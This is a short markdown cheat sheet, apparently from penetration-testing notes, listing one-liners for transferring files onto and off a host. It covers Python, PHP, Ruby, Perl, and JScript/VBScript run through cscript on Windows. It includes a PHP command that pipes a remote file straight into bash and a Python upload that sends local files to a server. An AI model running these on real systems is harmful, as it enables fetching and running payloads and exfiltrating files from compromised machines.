# **CODE FILE TRANSFER**

## Python Download

> ### Python3 
>
>     python3 -c 'import urllib.request;urllib.request.urlretrieve("<URI>", "<DESTINATION_FILE>")'

> ### Python2.7
>
>     python2.7 -c 'import urllib;urllib.urlretrieve ("<URI>", "<DESTINATION_FILE>")'

## PHP Download

> ### Using File_get_contents()
>
>     php -r '$file = file_get_contents("<URI>"); file_put_contents("<DESTINATION_FILE>",$file);'

> ### Using Fopen()
>```
>php -r 'const BUFFER = 1024; $fremote = 
>fopen("<URI>", "rb"); $flocal = fopen("<DESTINATION_FILE>", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, >$buffer); } fclose($flocal); fclose($fremote);'
>```

> ### Pipe to Bash
>
>     php -r '$lines = @file("<URI>"); foreach ($lines as $line_num => $line) { echo $line; }' | bash

## Ruby Download

    ruby -e 'require "net/http"; File.write("<DESTINATION_FILE>", Net::HTTP.get(URI.parse("<URI>")))'

## Perl Download

    perl -e 'use LWP::Simple; getstore("<URI>", "<DESTINATION_FILE>");'


## Javascript on Windows

    notepad.exe wget.js

> ### Paste into wget.js
>```
>var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
>```

> ### Download using cscript.exe
>
>     cscript.exe /nologo wget.js <URI> <DESTINATION_FILE>

## VBScript on Windows


    notepad.exe wget.vbs

> ### Paste into wget.vbs
>```
>dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
>dim bStrm: Set bStrm = createobject("Adodb.Stream")
>xHttp.Open "GET", WScript.Arguments.Item(0), False
>xHttp.Send
>
>with bStrm
>    .type = 1
>    .open
>    .write xHttp.responseBody
>    .savetofile WScript.Arguments.Item(1), 2
>end with
>```

> ### Download using cscript.exe
>
>     cscript.exe /nologo wget.vbs <URI> <DESTINATION_FILE>

## Upload with Python

> ### Start uploadserver
>
>     python3 -m uploadserver

> ### Upload 
>
>     python3 -c 'import requests;requests.post("<URL>/upload",files={"files":open("<SOURCE_FILE>","rb")})'